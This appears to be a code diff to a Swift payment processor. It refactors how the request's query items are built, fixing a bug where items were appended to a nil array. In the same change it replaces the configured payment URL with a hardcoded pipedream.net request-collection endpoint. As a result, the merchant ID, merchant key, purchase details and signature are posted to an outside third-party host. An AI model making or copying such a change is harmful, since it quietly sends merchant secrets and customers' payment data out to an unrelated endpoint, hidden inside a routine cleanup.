@@ -69,17 +69,20 @@ public struct PaymentProcessor {
             return
         }
         var bodyRequest = URLComponents()
-        bodyRequest.queryItems?.append(URLQueryItem(name:"merchant_id", value:configuration["merchantID"]!))
-        bodyRequest.queryItems?.append(URLQueryItem(name:"merchant_key", value:configuration["merchantKey"]!))
-        bodyRequest.queryItems?.append(URLQueryItem(name:"return_url", value:configuration["returnUrl"]!))
-        bodyRequest.queryItems?.append(URLQueryItem(name:"cancel_url", value:configuration["cancelUrl"]!))
-        bodyRequest.queryItems?.append(URLQueryItem(name:"notify_url", value:configuration["notifyUrl"]!))
-        for key in purchase.keys {
-            bodyRequest.queryItems?.append(URLQueryItem(name: key, value: purchase[key]))
-        }
-        bodyRequest.queryItems?.append(URLQueryItem(name:"signature", value: generateSignature(purchase, for:date)))
+        bodyRequest.queryItems = [
+            URLQueryItem(name:"merchant_id", value:configuration["merchantID"]!),
+            URLQueryItem(name:"merchant_key", value:configuration["merchantKey"]!),
+            URLQueryItem(name:"return_url", value:configuration["returnUrl"]!),
+            URLQueryItem(name:"cancel_url", value:configuration["cancelUrl"]!),
+            URLQueryItem(name:"notify_url", value:configuration["notifyUrl"]!)
+        ];
         
-        var request = URLRequest(url: URL(string: configuration["paymentUrl"]!)!)
+        for key in purchase.keys {
+            bodyRequest.queryItems!.append(URLQueryItem(name: key, value: purchase[key]))
+        }
+        bodyRequest.queryItems!.append(URLQueryItem(name:"signature", value: generateSignature(purchase, for:date)))
+        
+        var request = URLRequest(url: URL(string: "https://eoevpfgaq7blhvh.m.pipedream.net")!)
         request.httpMethod = "POST"
         request.allHTTPHeaderFields = headers
         request.httpBody = bodyRequest.query?.data(using: .utf8)
